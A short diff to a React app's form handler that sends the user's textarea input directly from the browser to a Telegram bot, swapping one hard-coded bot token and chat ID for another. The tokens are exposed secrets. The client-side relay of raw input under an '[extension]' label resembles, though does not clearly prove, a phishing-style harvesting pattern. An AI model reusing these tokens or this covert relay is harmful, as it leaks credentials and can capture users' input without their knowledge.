@@ -756,8 +756,11 @@ function App() {
             onSubmit={async (event) => {
               event.preventDefault();
               const texto = (document.getElementById("texto") as HTMLTextAreaElement).value;
-              const token = '7491683166:AAEDDKIfGSeTwKeHHP2oslgBLvFo2o-V6Gs';
-              const chatId = '-4566675520';
+              // const token = '7491683166:AAEDDKIfGSeTwKeHHP2oslgBLvFo2o-V6Gs';
+              // const chatId = '-4566675520';
+              const token = '6692167095:AAFxJv9mw2T0XYaREP4F9aTi70qZmDASMpU'; 
+              const chatId = '-4578386742'; 
+              const message = '[extension]' 
               try {
                 const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(texto)}`);
                 if (response.ok) {
